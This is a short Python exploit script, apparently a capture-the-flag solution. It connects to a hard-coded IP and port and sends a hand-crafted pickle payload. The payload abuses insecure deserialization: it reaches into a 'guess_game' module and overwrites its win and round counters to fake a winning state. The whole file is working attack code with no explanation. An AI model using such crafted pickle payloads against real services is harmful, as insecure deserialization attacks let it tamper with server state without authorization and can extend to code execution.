import pickle
import socket
import struct

s = socket.socket()
# s.connect(('172.17.0.2', 9999))
s.connect(('47.111.59.243', 8051))

exp = b'''cguess_game
game
}S"win_count"
I10
sS"round_count"
I9
sbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x01sb.'''

s.send(struct.pack('>I', len(exp)))
s.send(exp)

print(s.recv(1024))
print(s.recv(1024))
print(s.recv(1024))
print(s.recv(1024))
